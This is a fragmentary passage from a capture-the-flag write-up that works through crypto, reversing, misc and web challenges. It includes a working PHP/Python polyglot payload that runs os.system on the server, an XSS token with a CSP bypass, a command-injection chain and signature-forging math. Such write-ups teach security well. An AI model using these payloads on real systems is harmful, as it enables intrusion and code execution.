frequency, then the actual length of the source is important since when the length is doubled, the product of two weights will become 4 times the original, that affects the relative weight of nodes between different levels.\nSince guessing the correct source is difficult, we drafted the script for building Huffman tree and wait for hints. The script consists of replacable components:\n changeable source extracting the heaviest or the lightest node using fraction to store the frequency (denominator is 1 for integers) whether to use multiplication or addition  We used the Relative frequency in the English text at the moment, but we were uncertain about whether spaces and symbols should be included, and whether to treat capital and small letters separately.\nEventually the challenge author released the first hint:\n\nFrom this we know that the source should not be that relative frequency, but some pieces related to Alice in Wonderland. Following that, they released the next hint:\n\nThis proves our assumption, and we are certain that frequencies (instead of percentages) of letters is used. Also, this confirms that minimum weights is used, and multiplication is used for the new node.\nHere we start to think what the source the frequencies are taken from. We tried to use the letter frequencies from Alice in the Wonderland, and obtained the below \u0026quot;plaintext\u0026quot;:\nOJCCAUNQYLIOMAGAZAUQJHOFJJAIEWHEHPQDLJOGYCWARDFOERYEFELOHE Although all bits are consumed (We can immediately falsify a tree if there are leftover bits), the text looked nonsense.

And the first being:\n\n❓ Question. What exactly is this?  The second one is relatively direct.\n\nThe capital letters form the word UKMINT, which may refer to the royal mint (the government-owned mint in the United Kingdom). They recently produced the coin for Alice in Wonderland. More importantly, they also produced the coin featuring the Queen's Beasts:\n\nWhy is the riddle related to the Queen's Beasts? Here is the list of the beasts:\n The Lion of England The White Greyhound of Richmond The Yale of Beaufort The Red Dragon of Wales The White Horse of Hanover The White Lion of Mortimer The Unicorn of Scotland The Griffin of Edward III The Black Bull of Clarence The Falcon of the Plantagenets  We can see that each of the ten flags corresponds to a beast. This is the mapping between the two:\n Fierce Feline - The White Lion of Mortimer Pale Puppy - The White Greyhound of Richmond Goring Goat - The Yale of Beaufort Crowned Cat - The Lion of England Avian Ally - The Falcon of the Plantagenets Lion Aloft - The Griffin of Edward III Ruby Reptile - The Red Dragon of Wales Coal Cow - The Black Bull of Clarence Horned Horse - The Unicorn of Scotland Ivory Equine - The White Horse of Hanover  \n❓ Another Question. How to obtain the flag?  Well, the only clue left is the graph in the challenge pdf. At first glance, we should be able to conclude that the shape represents its corresponding beast's name by the puzzle index.\nHow about the x-axis? We can notice that there is only one shape per x-value, so it is having high chance that it is the character index of the meta-puzzle's flag.\nFinally, the y-axis then must be the character index of the corresponding beast's name. As the least y-index starts from 4, we can guess that all the beasts' name included the word \u0026quot;The\u0026quot;. Besides, there should be no spaces for the beasts' name as from the experence in previous challenges.\nFollowing the idea, we have the string below:\niFYouLlBEaieveinmeIllBelieveinyou There is one incorrect point (10, 18) which should be instead (10, 17).

The algorithm itself is simple:\ndef hash(data): assert len(data) % 8 == 0 state = [2**i-1 for i in range(1, 9)] for i in range(0, len(data), 8): block = data[i: i+8] state = sub(state) state = mix(block, state) state = shift(state) state = sub(state) return bytes(state).hex() The goal is to find a pair of inputs such that both digests are 00 00 00 00 00 00 00 00. Also, the sub, mix and shift methods are short:\ndef sub(state): return [SBOX[x] for x in state] def mix(block, state): for i in range(8): state[i] ^= block[7 - i] \u0026amp; 0x1f state[i] ^= block[i] \u0026amp; 0xe0 return state def shift(state): t = 0 for s in state: t ^= s u = state[0] for i in range(7): state[i] ^= t ^ state[i] ^ state[i+1] state[7] ^= t ^ state[7] ^ u return state We can implement the inverse functions for sub and shift (i.e., unsub and unshift) easily. With that said, we are able to recover a 8-byte input block with the below recover_payload, given the input and output states:\n# Find the 8-byte input block such that s -\u0026gt; t after one round of SMS def recover_payload(s, t): # t = shift(mix(x, sub(s))), where x is the input u = sub(s[:]) v = unshift(t[:]) # v = mix(x, u) x = [0 for _ in range(8)] for i in range(8): x[ i] ^= (u[i] ^ v[i]) \u0026amp; 0xe0 x[7-i] ^= (u[i] ^ v[i]) \u0026amp; 0x1f return x With the above function, it is not difficult to find a pair of messages such that they both hash to eight null bytes:\nt = unsub([0 for _ in range(8)]) x1 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], t) # x1 = 1d 3f 42 28 3b 54 3c db x2 = recover_payload([1, 3, 7, 15, 31, 63, 127, 255], [0, 0, 0, 0, 0, 0, 0, 0]) + \\ recover_payload([0, 0, 0, 0, 0, 0, 0, 0], t) # x2 = b5 97 ea 80 93 fc 94 73 11 11 11 11 11 11 11 11 Submitting the collision pair to the netcat service, we have the flag.

Also, both the functions do_magic and weird_function_1 are deterministic, and the values fed to the argument OooO in the function do_magic are always three-letter strings (the last one may be shorter, but it is just equivalent to the three-letter string with null bytes padded after it), which means each 3-character string can be easily brute-forced.

We are given a token for signing in as the guest, and the objective is to sign in as 3k-admin.\nTo be authenticated as $m$, one must provide an integer $r$ and a string $u$ such that\n\\[r^2 \\equiv \\text{SHA256}(m\\ \\|\\ u)\\ (\\text{mod}\\ n),\\]\nwhere $n$ is a product of two primes. The decryption algorithm is implemented below:\ndef decrypt(self, c): p, q = self.private mp = pow(c, (p+1)//4, p) mq = pow(c, (q+1)//4, q) _, yp, yq = xgcd(p, q) r = (yp * p * mq + yq * q * mp) % (self.public) return r def sign(self, m): U = os.urandom(20) c = int(hashlib.sha256(m + U).hexdigest(), 16) r = self.decrypt(c) return (r, int(U.hex(), 16)) The decryption algorithm is implemented in the same way as Wikipedia1 suggested. Does it mean that the signing algorithm is safe? No.\nFor Rabin cryptosystem, the ciphertext are quadradic residues because they are the square of their corresponding plaintexts. However, for the signing algorithm in the challenge, $h := \\text{SHA256}(m\\ \\|\\ u)$ is not necessarily a quadratic residue. In such cases, $r^2 \\not\\equiv h\\ (\\text{mod}\\ n)$.\nFor decrypt, we have $r \\equiv y_p\\cdot p\\cdot m_q + y_q\\cdot q\\cdot m_q\\ (\\text{mod}\\ n)$ with $y_p p + y_q q = 1$.\nTaking modulo $p$, we have $r \\equiv y_p\\cdot q\\cdot m_p\\equiv h^{(p+1)/4}\\cdot q\\cdot q^{-1}\\equiv h^{(p+1)/4} \\ (\\text{mod}\\ p)$. That said, $r^4 \\equiv h^{p+1}\\equiv h^2\\ (\\text{mod}\\ p)$. That implies $r^2 \\equiv \\pm h\\ (\\text{mod}\\ p)$. That implies $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ p)$. Likewise $r^2 - h \\equiv 0\\ \\text{or}\\ -2h\\ (\\text{mod}\\ q)$.\nAssuming that $r^2 - h\\equiv 0\\ (\\text{mod}\\ p)$ and $r^2 - h\\not\\equiv 0\\ (\\text{mod}\\ q)$, we have\n\\[\\gcd(n, r^2 - h) = p.\\]\nTherefore we are able retrieve a prime factor of $n$.

But apparently it is not the case:\n@app.route(\u0026#39;/compile\u0026#39;,methods = [\u0026#39;POST\u0026#39;]) @cross_origin() def compile(): c_type=request.form[\u0026#39;c_type\u0026#39;] filename=request.form[\u0026#39;filename\u0026#39;] if (c_type == \u0026#39;php\u0026#39;): if (filename[-3:]==\u0026#39;php\u0026#39;): if (check_file(\u0026#39;/home/app/test/\u0026#39;+filename)): path=\u0026#39;/home/app/test/\u0026#39;+filename cmd=\u0026#39;php -c php.ini \u0026#39;+path p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return \u0026#39;failed\u0026#39; else: return \u0026#39;noop\u0026#39; elif (c_type == \u0026#39;python\u0026#39;): if (filename[-2:]==\u0026#39;py\u0026#39;): if (check_file(\u0026#39;/home/app/test/\u0026#39;+filename)): cmd=\u0026#39;python3 \u0026#39;+filename p = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE) stdout, stderr = p.communicate() return stdout else: return \u0026#39;failed\u0026#39; else: return \u0026#39;noop\u0026#39; The Python part got a filename checking, but interestingly instead of checking .py, it only checks py. As expected, the PHP part got a lot of restriction on disable_functions and disable_classes, so we cannot directly write a py file through functions like file_put_contents. By running array_diff with the list of disable_functions and get_defined_functions()[\u0026quot;internal\u0026quot;], it shows a bunch of session-related functions. So apparently we need to create a session file that is executable by Python. Somehow it is a kind of polygot as well...\nFinal payload:\n\u0026lt;?php session_id(\u0026#39;creepy\u0026#39;);session_start();$_SESSION[\u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls /\u0026#39;)#\u0026#34;]=1; The session file it creates will look like this:\n__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls /\u0026#39;)#|i:1; The # is important to comment out the stuff afterwards.

A user can request downloading the image, which will trigger a command execution. At a first glance it needs trick like length extension attack to spoof the MAC but it is using hmac instead of pure sha256. But in fact it will sign any resource fetched by the service:\nfunction fetch_and_parse($page){ $a=file_get_contents(\u0026#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\u0026#34;.$page.\u0026#34;.html\u0026#34;); preg_match_all(\u0026#34;/\u0026lt;img src=\\\u0026#34;(.*?)\\\u0026#34;\u0026gt;/\u0026#34;, $a,$ma); return $ma; } And it could be spoofed like this:\nhttp://emoji.2021.3k.ctf.to/?dir=../../../ozetta/reponame/main/filename\nThe vulnerability is actually similar to this one 😏:\nhttps://web.archive.org/web/20201118140207/https://app.crackingthecryptic.com/sudoku/?puzzleid=..%2F..%2Fsudoku-sandbox-escape.appspot.com%2Fo%2Fpasswd\nThe difference is the challenge uses Github but CTC used Firebase previously, and both of them are serving the resource in the form https://domain/username/resource, so by using directory traversal, one can easily point the resource from the owner's account to the attacker's account.\nThen we can obtain a valid token by putting some images in the form of \u0026lt;img src=\u0026quot;...\u0026quot;\u0026gt; on the page. We can now go for the command execution part:\n$d = \u0026#34;bash -c \\\u0026#34;curl -o /dev/null \u0026#34;.escapeshellarg(\u0026#34;https://raw.githubusercontent.com/3kctf2021webchallenge/downloader/master/\u0026#34;.$url).\u0026#34; \\\u0026#34;\u0026#34;; The bash -c is suspicious, and escapeshellarg only handles single quote but not double quote.

However, Mystiz knew almost nothing about the challenge.  Part I. Kickstarting the Challenge We are provided a VM-type binary where the instructions is also inscribed in the binary (stored in byte_1040). The first 64 bytes being:\n06 00 00 06 01 01 06 02 02 06 03 03 03 00 00 03 01 00 03 02 00 03 03 00 08 00 00 05 00 01 08 00 00 05 00 02 08 00 00 05 00 03 08 00 00 06 00 04 06 01 05 06 02 06 06 03 07 03 00 00 03 01 00 03 When we try to execute the binary, we are asked to enter the flag. Let's try to send something in:\n$ ./crackme Enter the flag: ctf{THi5_FL46_I5_lE91t_4ND_Y0UR_CHeCK3R_SUXx\u0026amp;} Good Job We are done!\nHowever, unfortunately, the scoreboard does not accept our flag... Why? Let's look at the binary in detailed.\nPart II. Reversing the Virtual Machine At suggested in sub_93A, each instruction consists of three bytes. The first byte is the opcode, and the rest are the parameters. There are 14 opcodes supported:\nInstruction Description ----------- ----------- 01 A B REG[A] *= B 02 A B REG[A] -= B 03 A B REG[A] = ~REG[A] 04 A B REG[A] ^= MEM[B] 05 A B REG[A] = REG[B] 06 A B REG[A] = MEM[B] 07 A B IF REG[0] != 0: IP += A 08 A B putc(REG[0]) 09 A B exit(REG[0]) 10 A B REG[0] = getc() 11 A B REG[A] \u0026lt;\u0026lt;= B \u0026amp; 0x1F 12 A B REG[A] \u0026amp;= MEM[B] 13 A B REG[A] |= MEM[B] 14 A B REG[A] += REG[B] There are 2137 bytes in byte_1040. The first 2048 bytes are the instructions and the remaining 89 bytes are the memory (first eight bytes being ba 91 8b 9a 8d df 8b 97). Moreover, there are four bytes for the register. Note that IP above represents the instruction pointer, which will be increased by 3 unless IP += A is triggered. Notably, IP never decreases.\nWith that, let's try to understand the first few instructions:\n06 00 00 REG[0] = MEM[0] // REG[0] = 0xba 06 01 01 REG[1] = MEM[1] // REG[1] = 0x91 06 02 02 REG[2] = MEM[2] // REG[2] = 0x8b 06 03 03 REG[3] = MEM[3] // REG[3] = 0x9a 03 00 00 REG[0] = ~REG[0] // REG[0] = 0x45 03 01 00 REG[1] = ~REG[1] // REG[1] = 0x6e 03 02 00 REG[2] = ~REG[2] // REG[2] = 0x74 03 03 00 REG[3] = ~REG[3] // REG[3] = 0x65 08 00 00 putc(REG[0]) // Prints \u0026#34;E\u0026#34; 05 00 01 REG[0] = REG[1] // REG[0] = 0x6e 08 00 00 putc(REG[0]) // Prints \u0026#34;n\u0026#34; ... Part III. Here Comes the Angry Solvers cdemirer made an Angr-compatible version and ran against Angr. He got a flag that passes the check in no time:\nctf{dsdsdddddddasdadsdsddaddddaddddddsddsssds} The flag is accepted in the original binary. However, the scoreboard does not accept it. What was happening? Let's look at the first instructions those are called since the binary is reading bytes (denote the bytes being x0, x1, ...) from the user.\n 186 | REG[0] = getc() // REG[0] = x0 189 | REG[0] ^= MEM[16] // REG[0] = x0 ^ 0x63 192 | REG[3] += REG[0] // REG[3] = x0 ^ 0x63 195 | REG[0] = getc() // REG[0] = x1 198 | REG[0] ~= REG[0] // REG[0] = x1 ^ 0xff 201 | REG[0] ^= MEM[17] // REG[0] = x1 ^ 0x74 204 | REG[3] += REG[0] // REG[3] = (x0 ^ 0x63) + (x1 ^ 0x74) 207 | REG[0] = getc() // REG[0] = x2 210 | REG[1] = REG[0] // REG[1] = x2 213 | REG[0] ^= MEM[18] // REG[0] = x2 ^ 0x8a 216 | REG[1] \u0026amp;= MEM[18] // REG[1] = x2 \u0026amp; 0x8a 219 | REG[1] \u0026lt;\u0026lt;= 1 // REG[1] = (x2\u0026lt;\u0026lt;1) \u0026amp; 0x14 222 | REG[2] = REG[1] // REG[2] = (x2\u0026lt;\u0026lt;1) \u0026amp; 0x14 225 | REG[1] += REG[0] // REG[1] = ((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a) 228 | REG[2] += REG[0] // REG[2] = ((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a) 231 | REG[1] \u0026amp;= MEM[19] // REG[1] = (((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10 234 | REG[2] |= MEM[19] // REG[2] = (((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10 237 | REG[1] += REG[2] // REG[1] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 240 | REG[0] = REG[1] // REG[1] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 243 | REG[3] = REG[1] // REG[3] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) 246 | REG[0] = getc() // REG[0] = x3 249 | REG[1] = REG[0] // REG[1] = x3 252 | REG[1] ^= MEM[20] // REG[1] = x3 ^ 0x85 255 | REG[0] \u0026amp;= MEM[20] // REG[0] = x3 \u0026amp; 0x85 258 | REG[0] *= 2 // REG[0] = (x3 \u0026amp; 0x85) * 2 261 | REG[0] += REG[1] // REG[0] = ((x3 \u0026amp; 0x85) * 2) + (x3 ^ 0x85) 264 | REG[3] += REG[0] // REG[3] = ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) \u0026amp; 0x10) + ((((x2\u0026lt;\u0026lt;1) \u0026amp; 0x14) + (x2 ^ 0x8a)) | 0x10) + ((x3 \u0026amp; 0x85) * 2) + (x3 ^ 0x85) Coincidentally, there is an assignment to REG[3] before each getc() operations. If we assume that those REG[3] to be zero, we will find something surprising. That is:\nx0, x1, x2, x3 = 0x63, 0x74, 0x66, 0x7b which reads ctf{. Eventually, if we proceed with the assumption, we have the flag: ctf{vErtu4l_m4chine_pr0tection_is_soo_2010_xD}. Fixing some of the spelling mistakes we have the actual flag:\nctf{v1rtu4l_m4chine_pr0tection_is_soo_2010_xD} The checks are not strict. There are non-unique solutions being accepted to the checker. Alas, the other reversing challenges we solved are checking our input in a similar fashion, too. This is not a good sign\u0026hellip;  Imposter (Web; 485 points) Solved by ozetta.\nI spent a lot of time in this question not because my bug-radar is not working but because of the broken bot. I have to keep being tortured by the unpleasant reCAPTCHA. I started this challenge at around 9:30 pm Saturday local time, and found the bug very quickly (?) in around 20 minutes:\nhttp://imposter.2021.3k.ctf.to/view/posts.php/?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 First, the token is specifying the post object created by the user. As expected the post content is sanitized. But the token handling part is funny:\nif (!empty($_GET[\u0026#39;token\u0026#39;])){ try {\t$result = unserialize(base64_decode($_GET[\u0026#39;token\u0026#39;]))-\u0026gt;get_post(); } catch (Error $e) { echo unserialize(base64_decode($_GET[\u0026#39;token\u0026#39;])); } } It will show the unserialized object when error occurs. You know a string does not have a method called get_post(), right? So just serialize a string and base64 encode it as the token and make arbitrary payload. But if we use the original view post page, it will be blocked by CSP:\nhttp://imposter.2021.3k.ctf.to/view/posts.php?token=czoyNToiPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PiI7 which is due to the CSP created by \u0026lt;script src='../js/main.js'\u0026gt;\u0026lt;/script\u0026gt;. By using the Relative Path Overwrite (RPO, not ROP), we can get rid of that file. Note that both view//posts.php and view/posts.php/ work, but not /view/posts.php because /view/../js/main.js = /js/main.js is still valid while the other two will give view/js/main.js instead.\nAfter half an hour, I started bombard the author for the bot issue:\n\nOK things didn't go well. Let's try another author:\n\nFinally they took down the challenge to increase the resources at around 12:30 am Sunday local time. Maybe time to sleep? Well we decided to get some popcorn:\n\nThen I went to sleep at around 2 am. But I got woke up by my teammate later at 3:11 am to submit the payload:\n 🥶 Haiya time to sleep ar.\nBy the way, because the bot only accepts URL in the form view/posts.php?token={...}, we need to first use the meta refresh trick (which is not blocked by CSP) to kick the victim to the XSS page and steal the cookie. The detailed payload is left as an exercise for the readers.\nDigital (Crypto; 493 points) Solved by Mystiz.\nWe are given the parameters for digital signature algorithm (DSA):\n The modulus $p$ and the generator $g$ are around 2048 bits, and the order $q$ is 256 bits long.  On top of that, we are also given two pairs of DSA message-signature pairs, where the private key owner signs consecutively. One point worth noticing is that they are using a hand-crafted PRNG. The PRNG is seeded by 8 bytes from urandom:\nclass Random(): def __init__(self, seed): self.state = seed self.bits = self.state.bit_length() def next(self): self.state ^= self.state \u0026lt;\u0026lt; 76 self.state = rol(self.state, 32, self.bits) self.state ^= self.state \u0026gt;\u0026gt; 104 self.state = rol(self.state, 20, self.bits) self.state ^= self.state \u0026lt;\u0026lt; 116 self.state = rol(self.state, 12, self.bits) return self.state random = Random(int(os.urandom(8).hex(), 16)) Since their PRNG involves of xor's and rol's only, we can express the current and the next states (denoted by $k_1$ and $k_2$) explicitly:\n\\[\\begin{aligned} k_2 \u0026= \\text{ROL}(k_1, 64) \\oplus \\text{ROL}(k_1^{52..0}, 12) \\oplus \\text{ROL}(k_1^{24..0}, 32) \\\\ \u0026\\qquad \\oplus \\text{ROL}(k_1^{20..0}, 36) \\oplus k_1^{88..76} \\oplus k_1^{12..0} \\end{aligned}\\]\nWe can visualize the components for the next state in terms of the current state. We can see that $k_2^{128..64} = k_1^{64..0}$. That said, $k_1$ and $k_2$ share 64 bits of entropy, and they have 192 bits entropy in total.\n\nIn that way, we can write $k_1 := 2^{64} u + v$ and $k_2 := 2^{64} v + w$. Also, we have two pairs of message-signature pairs: $m_i$ and $r_i, s_i$'s which satisfy the below congruence (here $x$ is the secret flag):\n\\[k_is_i \\equiv h_i + xr_i\\ (\\text{mod}\\ q).\\]\nWe can eliminate $x$ by multiplying $r_2$ on the both sides of $k_1s_1 \\equiv h_1 + xr_1$ and multiplying $r_1$ on $k_2s_2 \\equiv h_2 + xr_2$. Eventually we can form a large congruence under modulo $q$:\n\\[k_1s_1r_2 - k_2s_2r_2 \\equiv h_1r_2 - h_2r_1\\ (\\text{mod}\\ q).\\]\nIn that way, the only unknowns are $k_1$ and $k_2$. Substituting $k_1 = 2^{64}u+v$ and $k_2 = 2^{64}v+w$, we have\n\\[2^{64}s_1r_2u + (- 2^{64}s_2r_1 + s_1r_2)v - s_2r_1w \\equiv h_1r_2-h_2r_1\\ (\\text{mod}\\ q).\\]\nWe can construct a lattice and use the LLL algorithm to find short vectors. The vector we want is $(0, -1, u, v, w)$.\nb = h1*r2 - h2*r1 a0 = 2**64 * s1*r2 a1 = -2**64 * s2*r1 + s1*r2 a2 = -s2*r1 A = Matrix(ZZ, [ [ b, 1, 0, 0, 0], # \u0026lt;- -1 [a0, 0, 1, 0, 0], # \u0026lt;- u (64 bits) [a1, 0, 0, 1, 0], # \u0026lt;- v (64 bits) [a2, 0, 0, 0, 1], # \u0026lt;- w (64 bits) [ q, 0, 0, 0, 0], # * ]) Q = diagonal_matrix([2**64, 2**64, 1, 1, 1]) A *= Q A = A.LLL() A /= Q We are able to retrieve the flag with the above Sage snippet - and we agreed that we should not roll our own PRNG algorithms.\n3k{Why_roll_your_0wn_random_???} Mokdad's Memories (Misc; 498 points) Solved by TWY.\nPart I. Analysis We are given a Python source code that takes el_mok.png as the input and outputs an image named brain_memory.png, and a remote service nc mokdadkey.2021.3k.ctf.to 1777.\nAs the source code states that the dimension of brain_memory.png is $887\\times499$, while the given brain_memory.png is $887\\times22$, probably something has been done to the original brain_memory.png.\n It may be a cropped part of the \u0026quot;brain memory\u0026quot;, or The dimension may be corrupted, or Other reason(s) that needs further investigation  In either of the first two cases, we know that the relative offsets between the pixels of the visible parts ($887\\times22$) are fixed.\nSince the given brain_memory.png can be loaded in MSPaint, but result in Internal Error in SAI2, we can deduce that the file has some sorts of errors.\nTo allow the file to be loaded by Python PIL library properly, we can use some more tolerant image editing software (e.g. GIMP / paint.net) that preserves transparency to open the file, then export to another png file for our use (suppose that the challenge does not have steganography involved, as stated in Home - About).\n This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something\u0026hellip;?

(without the single quotation marks, can be confirmed in later stage if we find the final image looks like random noises).\nThe next problem is to reverse the v = (key ^ p) % 18446744073709551615 part, where $18446744073709551615 = 2^{64}-1$, and $p$ is 64-bit.\nWhich means that $\\text{key} \\oplus p$ only differs from $\\text{key}$ in the lower 64 bits. Therefore, the lower bound of $\\text{key} \\oplus p$ is the result of changing all the lower 64 bits of $\\text{key}$ to 0.\nSince $v$ is the given remainder after the modulo operation, so $\\text{key} \\oplus p$ should be the next number $\\geq$ lower bound that have a remainder of $v$ after divided by $18446744073709551615$. (Actually there are two possible $p$'s if the lower bound satisfies $v$ (then the upper bound also), but the probability is neglectably low so we can just ignore that :) )\n# Reverse key = bytes_to_long(b\u0026#34;_D3f1nItEly_giV3_IT_@_Sh0T_th1s_Is_n0T_4rT_BuT_th3_3aRt_0f_m3kD4d_sH1Li_\u0026#34;) key_mask_length = (18446744073709551615).bit_length() # 64 key_low64 = key \u0026amp; (2 ** key_mask_length - 1) key_mask64 = key ^ key_low64 ffmok_bytes = b\u0026#34;\u0026#34; for i in range(0, len(fffmok_pixels) - 1, 2): r1, g1, b1, o1 = fffmok_pixels[i] r2, g2, b2, o2 = fffmok_pixels[i + 1] v = bytes_to_long(bytes([r1, g1, b1, o1, r2, g2, b2, o2])) p = ((key_mask64 - (key_mask64 - v) % 18446744073709551615) + 18446744073709551615) ^ key # assert (p ^ key) % 18446744073709551615 == v ffmok_bytes += p.to_bytes(8, \u0026#34;big\u0026#34;) ffmok_bytes += bytes(fffmok_pixels[-1])# Source fmok_bytes = b\u0026#34;\u0026#34;.join(map(bytearray, fmok_pixels)) k = (int(\u0026#34;\u0026#34;.join([hex(_)[2:] for _ in iv]), 16) ** 4).to_bytes(32, \u0026#34;little\u0026#34;) # b\u0026#39;\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01\u0026#39; iv = b\u0026#39;\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF\u0026#39; aes = AES.new(k, AES.MODE_CBC, iv) ffmok_bytes = aes.encrypt(fmok_bytes[:-4]) + fmok_bytes[-4:] # Reverse k = b\u0026#39;\\x10\\x82u\\x98:\\x1c\\x0fy\\x10/4{\\xd8\\xc3\\xa9u\\xe3x\\x8a\\x9d3ru\\xc1\\x93\\xf5i\\x8c6\\xdf\\x15\\x01\u0026#39; iv = b\u0026#39;\\xbb\\x9c\\xe2\\x8d\\xd0\\xd1\\xbe@\\xf6l\\x02\\xc95\\x15\\x1cF\u0026#39; aes = AES.new(k, AES.MODE_CBC, iv) fmok_bytes = aes.decrypt(ffmok_bytes[:-4]) + ffmok_bytes[-4:] fmok_pixels = [[fmok_bytes[i+j] for j in range(8) if i + j \u0026lt; len(fmok_bytes)] for i in range(0, len(fmok_bytes), 8)] Notice that k is the \u0026quot;iv (in big endian) raised to the 4th power (i.e. squared twice)\u0026quot; in little endian.\nTherefore, the iv can be recovered by:\niv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, \u0026#39;little\u0026#39;)))))) # iv = tuple(b\u0026#34;ASDFQWER\u0026#34;)# Source iv = (X, X, X, X, X, X, X, X) # Of course it\u0026#39;s REDACTED prev = iv fmok_pixels = [] for i in range(0, len(mok_bytes), 8): prev = tuple(map(lambda x, y: x ^ y, mok_bytes[i:i+8], prev)) fmok_pixels.append(prev) # Reverse iv = tuple(long_to_bytes(int(isqrt(isqrt(int.from_bytes(k, \u0026#39;little\u0026#39;)))))) prev = iv mok_bytes = b\u0026#34;\u0026#34; for i in fmok_pixels: appending = bytes(map(lambda x, y: x ^ y, i, prev)) # assert tuple(map(lambda x, y: x ^ y, appending, prev)) == tuple(i) mok_bytes += appending prev = tuple(i)# Source mok = Image.open(\u0026#34;el_mok.png\u0026#34;) mok_bytes = mok.tobytes() # Reverse mok = Image.frombytes(\u0026#39;RGBA\u0026#39;, (887,499), mok_bytes, \u0026#39;raw\u0026#39;) mok.save(\u0026#34;el_mok.png\u0026#34;) We actually cannot figure out the dimensions of el_mok.png from the source code. But considering the source code looks like encryption, and both $887$ and $499$ are primes, we can first assume that el_mok.png is also $887\\times499$ unless we find the resulting image misaligned.\nWe can test the reversed source code for the fixed(?) brain_memory.png, leaving all the unseen part as black or any color. (Due to the action of per-block xor-mod and the property of CBC block cipher decryption mode, the unknown bytes should not propagate beyond the neighbouring blocks.)\n\nWe can already notice a man in the middle of this image, but since most parts are unknown, maybe the sources have already provided enough details but something is hidden?\nPart III. Finding out the Culprit Summary. This png file exported has much smaller size (About 76 KB) than the original file (About 1.7 MB), and $\\frac{1.7 \\text{MB}}{76 \\text{KB}} \\approx \\frac{499}{22}$, maybe we can confirm something \u0026hellip;?  Yes, all the pixels ($887\\times499$) are actually included in brain_memory.png, the only problem is that the dimension is not probably set (modified in some ways).\nBy checking the W3 specification2 of PNG file, we can know that the height is the 5th to the 8th bytes after the start of IHDR chunk. (The 1st to the 4th bytes are the width)\n00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452 .PNG........IHDR 00000010: 0000 0377[0000 0016]0806 0000 0063 7365 ...w.........cse So we directly modify 00000016 (22) to 000001f3 (499) to see if it works.\nMSPaint: Success SAI2: Internal Error GIMP: Error paint.net: Success So we can just use paint.net to fix the remaining parts by exporting the image rendered by it.\nPart IV.

The Memories Recovered \nTherefore, the flag is 3k{I_Am_50_pR3t7y_W1tH_My_H4IR}.\nLayers (Reverse; 488 points) Solved by Mystiz and cdemirer.\nNote. This is written based on their first revision of the code. They have released a new revision which has a different offset.  We are given a 64-bit ELF called layers in the challenge. The functions are obfuscated so that the logic is not trivial to read. For instance, sub_400E40 is one of relatively simpler function:\n__int64 __fastcall sub_400E40(const char *a1) { size_t v1; // rax  signed int v2; // ecx  signed int v4; // [rsp+2Ch] [rbp-14h]  int v5; // [rsp+30h] [rbp-10h]  unsigned int v6; // [rsp+34h] [rbp-Ch]  v6 = 0; v5 = 0; v4 = 0x1EB0722D; while ( v4 != 0x87679F00 ) { switch ( v4 ) { case (int)0x9415E80F: ++v5; v4 = 0x1EB0722D; break; case 0x12F4C285: v6 += a1[v5]; v4 = 0x9415E80F; break; case 0x1EB0722D: v1 = strlen(a1); v2 = 0x87679F00; if ( v5 \u0026lt; v1 ) v2 = 0x12F4C285; v4 = v2; break; } } return v6; } Part I. Drawing State Machines For sub_400E40 we mentioned above, we can see that the code to be executed is determined by v4. For instance, when v4 = 0x1EB0722D, then v1 = strlen(a1) and will jump to 0x12F4C285 if v5 \u0026lt; v1, or otherwise 0x87679F00. I think this is pretty similar to a state machine (where v4 is the state), hence I started to draw the figures. Let's see sub_400E40 visually:\ndigraph { node [shape=\u0026#34;box\u0026#34;]; \u0026#34;BEGIN\u0026#34; -\u0026gt; \u0026#34;0x1EB0722D\u0026#34; \u0026#34;0x87679F00\u0026#34;[label=\u0026#34;END\u0026#34;] \u0026#34;0x9415E80F\u0026#34;[label=\u0026#34;++v5\u0026#34;] \u0026#34;0x9415E80F\u0026#34;-\u0026gt;\u0026#34;0x1EB0722D\u0026#34; \u0026#34;0x12F4C285\u0026#34;[label=\u0026#34;v6 += a1[v5]\u0026#34;] \u0026#34;0x12F4C285\u0026#34;-\u0026gt;\u0026#34;0x9415E80F\u0026#34; \u0026#34;0x1EB0722D\u0026#34;[label=\u0026#34;v1 = strlen(a1)\u0026#34;] \u0026#34;0x1EB0722D\u0026#34;-\u0026gt;\u0026#34;0x12F4C285\u0026#34;[label=\u0026#34;v5 \u0026lt; v1\u0026#34;] 